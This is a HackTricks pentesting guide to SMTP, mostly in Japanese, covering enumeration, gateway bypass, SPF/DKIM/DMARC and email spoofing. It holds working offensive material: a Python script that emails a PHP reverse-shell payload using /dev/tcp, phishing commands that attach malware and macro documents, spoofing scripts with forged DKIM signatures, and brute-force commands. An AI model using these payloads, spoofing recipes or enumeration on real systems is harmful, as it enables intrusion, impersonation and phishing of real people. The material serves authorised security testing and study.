# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}


## **基本情報**

The **Simple Mail Transfer Protocol (SMTP)** は、TCP/IP スイート内で電子メールの送受信に利用されるプロトコルです。受信側でメッセージをキューイングする機能に制限があるため、SMTP はしばしば POP3 や IMAP と併用されます。これらの追加プロトコルにより、ユーザーはサーバー上のメールボックスにメッセージを保存し、定期的にダウンロードすることができます。

実際には、電子メールプログラムが送信用に SMTP を使用し、受信用に POP3 や IMAP を使用することが一般的です。Unix ベースのシステムでは、sendmail が電子メール用途で最も頻繁に使用される SMTP サーバーとして際立っています。商用パッケージである Sendmail は POP3 サーバーを含んでいます。さらに、Microsoft Exchange は SMTP サーバーを提供し、POP3 サポートを含めるオプションを提供しています。

**Default port:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
## メールセキュリティゲートウェイ (SEGs)

この[blog post](https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/)で述べられているように、**Secure Email Gateways (SEGs)** は受信メールフロー上にインラインで配置され、メールサーバーの代わりにSEGを指すように **MX recordsを変更して** 動作します。SEGは受信メールを検査します（例：IP reputation、blocklists、SPF checks、spoofing detection、metadata/content analysis、sandboxing、URL rewriting）。その後、ポリシーに基づいてメッセージを転送、破棄、または隔離します。セキュリティモデルは **すべての受信メールが最初にSEGに到達する** ことを前提としています。もしメールサーバーに直接到達できるなら、SEGは **回避され得ます**（オリジンに直接接続してWAFをスキップするのと同様）。

### MX不一致によるSEGsの回避

Entra ID / Exchange Online を使用している組織は多くの場合 **複数の accepted domains** を持っています。もし **任意の accepted domain** がMXレコードでSEGではなくメールサーバー（例：Exchange Online）を直接指している場合、そのドメインにメールを配信して**SEGを回避**できます。これは**misconfiguration（設定ミス）**であり脆弱性ではありませんが、依然として一般的なギャップです。

またデフォルトの `<tenant>.onmicrosoft.com` ドメインにも注意してください：そのMXレコードは常に Exchange Online を指します。`*.onmicrosoft.com` への受信が**ロックされていない**場合、`user@<tenant>.onmicrosoft.com` 宛に送信するとSEGをバイパスして直接受信トレイに届く可能性があります。

**防御上の注意事項**:

- `*.onmicrosoft.com` への受信をロックダウンする。
- 定期的に accepted domains とその MX ルーティングを監査する。
- メールサーバーを、受信を**SEGからのみ受け入れる**ように設定する。

### EMAIL Headers

もし victim に（例えばウェブページの問い合わせフォーム経由で）あなたにメールを送らせる機会があるなら、そうしてください。メールのヘッダを見ることで**被害者の内部トポロジーを把握できる可能性がある**からです。

また、SMTPサーバーが存在しないアドレス宛にメールを送ろうとして返ってくる NDN メールを受け取ることで、そのSMTPサーバーからのメールを得られる場合があります。ただし、送信するメールは許可されたアドレスからであること（SPF ポリシーを確認）と、NDN メッセージを受信できることを確認してください。

ヘッダにより興味深い情報（例: `X-Virus-Scanned: by av.domain.com`）が見つかることがあるため、異なる内容のメールを送ってみるべきです。EICAR テストファイルを送信してください。**AV** を検出できれば、**既知の脆弱性** を悪用できる可能性があります。

## 基本的な操作

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 組織のMXサーバーを見つける
```bash
dig +short mx google.com
```
### 列挙
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - 情報開示

サーバーがNTLM auth (Windows) をサポートしている場合、機密情報（バージョン等）を取得できます。詳細は[**here**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)。
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
または **これを自動化する** に **nmap** プラグイン `smtp-ntlm-info.nse`

### 内部サーバ名 - 情報漏洩

一部のSMTPサーバは、"MAIL FROM" コマンドが完全なアドレスなしで発行された場合に送信者のアドレスを自動補完し、内部名を開示します：
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

ポート25宛のパケットからパスワードをsniffできるか確認する

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Username Bruteforce Enumeration

**Authentication is not always needed**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 自動化ツール
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## DSNレポート

**Delivery Status Notification Reports**: 組織に**メール**を**無効なアドレス**宛てに送信すると、組織はそのアドレスが無効であることを通知するために**返信メール**を送ってきます。返送されたメールの**ヘッダー**には、やり取りに関与したメールサービスのIPアドレスやアンチウイルスソフトの情報など、**機密情報**が含まれている可能性があります。

## [Commands](smtp-commands.md)

### linux コンソールからのメール送信
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
ファイルを `swaks` で添付する際は、ファイル名の文字列ではなくファイルのバイトが埋め込まれるように、`@` プレフィックスを使用してください。これはマクロ文書を配布する際に重要です:
```bash
swaks --to hr@example.local --from attacker@evil.com --header "Subject: Resume" --body "Please review" --attach @resume.doc --server 10.0.0.5
```
### Pythonでメールを送信する

<details>

<summary>ここに Python コード</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

SMTP Smuggling の脆弱性により、すべての SMTP 保護を回避できる（保護についての詳細は次のセクションを参照）。SMTP Smuggling の詳細については以下を参照：

{{#ref}}
smtp-smuggling.md
{{#endref}}

## Mail Spoofing Countermeasures

組織は、SMTP メッセージのなりすましが容易であるため、**SPF**, **DKIM**, および **DMARC** を導入して、組織名義で不正に送信されるメールを防止します。

A **complete guide to these countermeasures** is made available at [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [was "deprecated" in 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). This means that instead of creating a **TXT record** in `_spf.domain.com` you create it in `domain.com` using the **same syntax**.\
> Moreover, to reuse previous spf records it's quiet common to find something like `"v=spf1 include:_spf.google.com ~all"`

**Sender Policy Framework** (SPF) は、Mail Transfer Agents (MTAs) が送信ホストが許可されているかを、組織が定義した許可済みメールサーバの一覧を照会して検証できる仕組みです。この一覧は IP アドレス/範囲、ドメイン、その他ドメイン名の代理でメールを送信することが**許可されている**エンティティを指定し、SPF レコードにはさまざまな「**Mechanisms**」が含まれます。

#### Mechanisms

From [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mechanism | Description                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 常にマッチします。以前のメカニズムと一致しないすべての IP に対するデフォルト結果（例: `-all`）に使用されます。                                                                                                                                                                                                                                  |
| A         | ドメイン名が送信元のアドレスに解決できるアドレスレコード (A or AAAA) を持っている場合にマッチします。                                                                                                                                                                                                                   |
| IP4       | 送信者が指定された IPv4 アドレス範囲内にある場合にマッチします。                                                                                                                                                                                                                                                                              |
| IP6       | 送信者が指定された IPv6 アドレス範囲内にある場合にマッチします。                                                                                                                                                                                                                                                                              |
| MX        | ドメイン名が送信元のアドレスに解決する MX レコードを持っている場合にマッチします（つまり、メールがそのドメインの受信用メールサーバのいずれかから来ている）。                                                                                                                                                                          |
| PTR       | クライアントのアドレスに対するドメイン名（PTR レコード）が指定されたドメインに含まれ、そのドメイン名がクライアントのアドレスに解決される（forward-confirmed reverse DNS）場合にマッチします。このメカニズムは推奨されず、可能であれば回避すべきです。                                                                                     |
| EXISTS    | 指定されたドメイン名がいかなるアドレスに解決される場合にマッチします（解決先のアドレスは問わない）。これはほとんど使用されません。SPF マクロ言語と組み合わせることで、DNSBL クエリのようなより複雑なマッチが可能になります。                                                                                                                           |
| INCLUDE   | 別ドメインのポリシーを参照します。そのドメインのポリシーが PASS ならこのメカニズムは PASS になります。ただし、参照先のポリシーが FAIL の場合でも処理は継続します。別ドメインのポリシーに完全に委任するには、redirect 拡張を使用する必要があります。                                                                                     |
| REDIRECT  | <p>redirect は SPF ポリシーをホストする別ドメイン名へのポインタで、複数のドメインが同じ SPF ポリシーを共有できるようにします。同じメールインフラを共有する多数のドメインを扱う場合に有用です。</p><p>redirect メカニズムで指定されたドメインの SPF ポリシーが使用されます。</p> |

It's also possible to identify **Qualifiers** that indicates **what should be done if a mechanism is matched**. By default, the **qualifier "+"** is used (so if any mechanism is matched, that means it's allowed).\
You usually will note **at the end of each SPF policy** something like: **\~all** or **-all**. This is used to indicate that **if the sender doesn't match any SPF policy, you should tag the email as untrusted (\~) or reject (-) the email.**

#### Qualifiers

Each mechanism within the policy may be prefixed by one of four qualifiers to define the intended result:

- **`+`**: PASS 結果に対応します。デフォルトではメカニズムはこの qualifier を想定しているため、`+mx` は `mx` と同等です。
- **`?`**: NEUTRAL 結果を表し、NONE（特にポリシーがない）と同様に扱われます。
- **`~`**: SOFTFAIL を示し、NEUTRAL と FAIL の中間の扱いです。この結果に該当するメールは通常受け入れられますが、マークされます。
- **`-`**: FAIL を示し、メールを明確に拒否すべきことを示します。

In the upcoming example, the **SPF policy of google.com** is illustrated. Note the inclusion of SPF policies from different domains within the first SPF policy:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
従来、正しい/有効なSPFレコードを持たないドメイン名であれば、容易になりすましが可能でした。**現在では**、**メール**が**有効なSPFレコードを持たないドメイン**から送信されると、**自動的に拒否/信頼されないものとしてマークされる**可能性が高いです。

To check the SPF of a domain you can use online tools like: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIMは送信メールに署名するために使われ、ドメインの公開鍵をDNSから取得することで外部のMail Transfer Agents (MTAs)による検証を可能にします。この公開鍵はドメインのTXTレコードに格納されています。鍵にアクセスするには、selectorとドメイン名の両方を知っている必要があります。

例えば、鍵を要求するにはドメイン名とselectorが必要です。これらはメールヘッダの`DKIM-Signature`に記載されています。例: `d=gmail.com;s=20120113`

この情報を取得するためのコマンドは次のようになります:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (ドメインベースのメッセージ認証、報告、および適合)

DMARCはSPFおよびDKIMプロトコルを基にしてメールのセキュリティを強化します。特定ドメインからのメールの処理に関するポリシーを定め、認証失敗時の対処方法やメール処理のアクションに関するレポートの送付先を指定します。

**DMARCレコードを取得するには、サブドメイン \_dmarc をクエリする必要があります**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC タグ

| タグ名   | 目的                                          | 例                              |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | プロトコルのバージョン                        | v=DMARC1                        |
| pct      | フィルタリング対象メッセージの割合            | pct=20                          |
| ruf      | フォレンジックレポートの送信先URI             | ruf=mailto:authfail@example.com |
| rua      | 集計レポートの送信先URI                       | rua=mailto:aggrep@example.com   |
| p        | 組織ドメインのポリシー                        | p=quarantine                    |
| sp       | 組織ドメインのサブドメインに対するポリシー    | sp=reject                       |
| adkim    | DKIMのアラインメントモード                    | adkim=s                         |
| aspf     | SPFのアラインメントモード                     | aspf=r                          |

### **サブドメインについては？**

出典： [**here**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
メールを送信する各サブドメインごとに、個別のSPFレコードが必要です。\
以下は元々 openspf.org に投稿されたもので、この種の情報に関してはかつて優れたリソースでした。

> The Demon Question: What about subdomains?
>
> If I get mail from pielovers.demon.co.uk, and there's no SPF data for pielovers, should I go back one level and test SPF for demon.co.uk? No. Each subdomain at Demon is a different customer, and each customer might have their own policy. It wouldn't make sense for Demon's policy to apply to all its customers by default; if Demon wants to do that, it can set up SPF records for each subdomain.
>
> So the advice to SPF publishers is this: you should add an SPF record for each subdomain or hostname that has an A or MX record.
>
> Sites with wildcard A or MX records should also have a wildcard SPF record, of the form: \* IN TXT "v=spf1 -all"

理にかなっています — サブドメインは異なる地理的ロケーションにあり、まったく異なるSPF定義を持っている可能性があります。

### **Open Relay**

メール送信時に、受信側でスパムと判定されないようにすることは非常に重要です。これは多くの場合、**relay server that is trusted by the recipient** を利用することで達成されます。しかし、管理者がどの **IP ranges are safe to allow** を完全に把握していないことがよくあり、この理解不足が SMTP サーバ設定のミスにつながることがあり、セキュリティ評価で頻繁に指摘されるリスクです。

特に潜在的または継続中のクライアントとのやり取りに関してメール配送の問題を避けるために、一部の管理者が取る回避策は、**任意のIPアドレスからの接続を許可する** ことです。これは SMTP サーバの `mynetworks` パラメータを全てのIPアドレスを受け入れるように設定することで行われ、以下のようになります：
```bash
mynetworks = 0.0.0.0/0
```
外部の任意の送信元からメールを転送できる open relay かどうかを確認するには、`nmap` ツールが一般的に使われます。これにはそれをテストする専用のスクリプトが含まれています。例えば、IP 10.10.10.10 のサーバーをポート 25 で verbose モードでスキャンするコマンドは次のとおりです：

```bash
nmap -p 25 --script smtp-open-relay -v 10.10.10.10
```
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **ツール**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF と DMARC の誤設定をチェック**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **SPF と DMARC の設定を自動取得**

### なりすましメール送信

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**またはツールを使用することもできます:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> もしキーを解析する際に **error using in the dkim python lib** が発生したら、以下のものを自由に使用してください。\
> **NOTE**: これは、何らかの理由で openssl private key が **cannot be parsed by dkim** 場合に素早くチェックするための応急的な対処です。
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**または手動で行うこともできます：**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># This will send an unsigned message
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **詳細情報**

**これらの対策に関する詳細は** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **その他のフィッシング指標**

- ドメインの年齢
- IPアドレスを直接指すリンク
- リンク操作の手法
- 疑わしい（珍しい）添付ファイル
- 破損したメールコンテンツ
- メールヘッダの値と異なる値が使用されている
- 有効で信頼できるSSL証明書の存在
- ページがウェブコンテンツフィルタリングサイトに送信されている

## SMTP経由のExfiltration

**SMTPでデータを送信できる場合は** [**read this**](../../generic-hacking/exfiltration.md#smtp)**.**

## 設定ファイル

### Postfix

通常、インストールされている場合、`/etc/postfix/master.cf` には、たとえばユーザーに新しいメールが届いたときに実行される **実行されるスクリプト** が含まれます。例えば行 `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` は、ユーザー mark に新しいメールが届いた場合に `/etc/postfix/filtering` が実行されることを意味します。

Other config files:
```
sendmail.cf
submit.cf
```
## 参考資料

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- <https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/>

## HackTricks 自動コマンド
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
